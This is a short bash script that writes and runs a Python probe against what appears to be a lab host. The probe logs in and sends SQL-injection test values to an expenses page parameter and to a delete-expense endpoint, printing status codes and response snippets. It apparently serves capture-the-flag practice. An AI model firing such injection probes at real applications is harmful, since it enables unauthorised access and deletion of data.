#!/bin/bash
cat > /tmp/o752c.py <<'EOF'
import re, requests
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:17222"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.post(A + "/login", data={"username": "hacker1", "password": "pass1234"}, timeout=20, allow_redirects=True)

def probe(url, params=None, method="GET"):
    try:
        if method == "GET":
            r = s.get(url, params=params, timeout=20)
        else:
            r = s.post(url, timeout=20, allow_redirects=False)
        return r.status_code, r.text[:150].replace("\n", " ")
    except Exception as e:
        return "EXC", type(e).__name__

print("=== page ===")
for p in ("1", "2", "1'", "1 AND 1=1", "-1", "999999"):
    code, body = probe(A + "/expenses", {"page": p})
    rows = len(re.findall(r"<td>AAA</td>|<td>BBB</td>", body if isinstance(body, str) else ""))
    print("page=%-12r -> %s  (body %d o)" % (p, code, len(body) if isinstance(body, str) else 0))

print()
print("=== delete_expense ===")
for i in ("1", "1'", "1 OR 1=1", "999"):
    code, body = probe(A + "/delete_expense/" + requests.utils.quote(i), method="GET")
    print("id=%-12r -> %s %s" % (i, code, str(body)[:90]))
EOF
python3 /tmp/o752c.py
